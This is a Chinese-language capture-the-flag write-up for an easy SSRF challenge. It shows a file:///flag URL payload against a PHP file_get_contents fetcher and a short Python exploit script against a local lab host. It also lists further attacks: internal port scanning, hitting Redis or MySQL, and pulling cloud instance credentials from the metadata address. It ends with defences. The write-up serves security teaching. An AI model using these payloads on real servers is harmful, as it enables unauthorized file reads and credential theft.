# SSRF 服务端请求伪造

## 题目信息

- **题目名称**：让服务器帮我访问
- **难度**：★★☆☆☆
- **考点**：SSRF（Server-Side Request Forgery）

## 题目描述

这个网站有一个功能：输入一个 URL，它会帮你抓取页面内容。但它能访问的，不只是公网。内网里有什么？

## 解法步骤

### 第一步：分析功能

页面提供了一个 URL 输入框，服务器会使用 `file_get_contents()` 函数抓取指定 URL 的内容并显示。

### 第二步：使用 file:// 协议

由于 `file_get_contents()` 支持多种协议，攻击者可以使用 `file://` 协议读取服务器上的本地文件：

```
/?url=file:///flag
```

### 第三步：获取 Flag

**自动化 Exploit：**

```python
#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13389'
r = requests.get(f'{BASE}/?url=file:///flag')
import re
flag = re.search(r'flag\{[^}]+\}', r.text).group()
print(f'[+] {flag}')
```

## 漏洞原理

### SSRF

SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者通过服务器作为代理，向内部系统发起请求。在 PHP 中，`file_get_contents()`、`curl_exec()` 等函数默认支持多种协议，包括：

| 协议 | 用途 |
|------|------|
| `http://` / `https://` | 访问 HTTP 资源 |
| `file://` | 读取本地文件 |
| `ftp://` | 访问 FTP 服务 |
| `php://` | 访问 PHP 输入/输出流 |

### 进阶利用

除了读取本地文件，SSRF 还可以用于：

- **扫描内网端口**：尝试访问 `http://127.0.0.1:{port}` 判断内网服务
- **攻击内网服务**：如 Redis、MySQL、Elasticsearch 等未授权访问的服务
- **利用云服务元数据**：在云环境中访问 `http://169.254.169.254/` 获取实例凭据

### 防御方法

- 限制请求目标为白名单域名
- 禁用不必要的协议（如 `file://`、`ftp://`）
- 禁止访问内网 IP 地址范围
